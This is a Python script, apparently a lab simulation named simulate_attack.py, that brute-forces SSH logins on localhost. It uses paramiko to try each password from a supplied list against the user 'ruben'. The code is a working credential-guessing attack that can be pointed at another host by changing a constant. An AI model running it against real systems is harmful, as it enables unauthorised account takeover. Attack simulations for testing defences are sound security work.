import paramiko
import sys
import time

TARGET = 'localhost'
USERNAME = 'ruben'
DELAY_SECONDS = 1


def load_passwords(filename):
    with open(filename) as f:
        return [line.strip() for line in f if line.strip()]


def try_login(password):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(TARGET, username=USERNAME, password=password, timeout=5)
        print(f'SUCCESS with password: {password}')
        client.close()
        return True
    except paramiko.AuthenticationException:
        print(f'Failed: {password}')
        return False
    except Exception as e:
        print(f'Error with "{password}": {e}')
        return False


def main():
    if len(sys.argv) != 2:
        print('usage: python3 simulate_attack.py <password_list_file>')
        return

    passwords = load_passwords(sys.argv[1])
    print(f'Loaded {len(passwords)} candidate passwords, attacking {TARGET} as {USERNAME}...')

    for pwd in passwords:
        if try_login(pwd):
            print('Password found! Stopping.')
            break
        time.sleep(DELAY_SECONDS)


if __name__ == '__main__':
    main()